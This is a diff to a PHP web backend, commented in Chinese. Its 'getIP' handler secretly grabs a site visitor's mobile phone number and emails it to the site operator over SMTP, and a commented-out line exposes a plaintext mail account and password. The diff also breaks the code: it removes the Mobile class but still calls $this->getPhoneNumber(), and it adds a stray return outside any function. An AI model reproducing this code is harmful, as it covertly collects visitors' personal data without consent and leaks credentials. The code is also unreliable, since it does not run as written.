@@ -3,12 +3,6 @@ require("../conn/conn.php");
 header('Content-type:text/json'); 
 require_once('360_safe3.php');
 require_once "Smtp.class.php";
-
-/**
- * 
- */
-class Mobile
-{
 /**
 * 函数名称: getPhoneNumber
 * 函数功能: 取手机号
@@ -217,7 +211,6 @@ function getIP()
          $ip=$ip_;
        }
        return $ip;
-}
 }
 function SendMail($to, $title, $content) {
     Vendor('PHPMailer.PHPMailerAutoload');
@@ -667,8 +660,7 @@ if ($action=="bmtj"){
 	}
 	if ($action=="getIP") {
         //抓取访问者手机号码
-        $ismoblie = new Mobile;
-    $iss = $ismoblie->getPhoneNumber();
+        if (!empty($this->getPhoneNumber())) {
         	//******************** 配置信息 ********************************
 				$smtpserver = "smtp.163.com";//SMTP服务器
 				$smtpserverport =25;//SMTP服务器端口
@@ -681,14 +673,14 @@ if ($action=="bmtj"){
 				// $smtpuser = "linyouqun@163.com";//SMTP服务器的用户帐号，注：部分邮箱只需@前面的用户名
 				// $smtppass = "yanyan38";//SMTP服务器的用户密码
 				$mailtitle = "网站抓取到新的手机号码";//邮件主题
-				$mailcontent = "<h1>电话：{$iss}</h1>";//邮件内容
+				$mailcontent = "<h1>电话：{$this->getPhoneNumber()}</h1>";//邮件内容
 				$mailtype = "HTML";//邮件格式（HTML/TXT）,TXT为文本邮件
 				//************************ 配置信息 ****************************
 				$smtp = new Smtp($smtpserver,$smtpserverport,true,$smtpuser,$smtppass);//这里面的一个true是表示使用身份验证,否则不使用身份验证.
 				$smtp->debug = false;//是否显示发送的调试信息
 				$state = $smtp->sendmail($smtpemailto, $smtpusermail, $mailtitle, $mailcontent, $mailtype);
-			
-     
+				return false;
+        }
 		// 讲ip入库
 		  $cip = $_POST['cip'];
 		  $cname = $_POST['cname'];
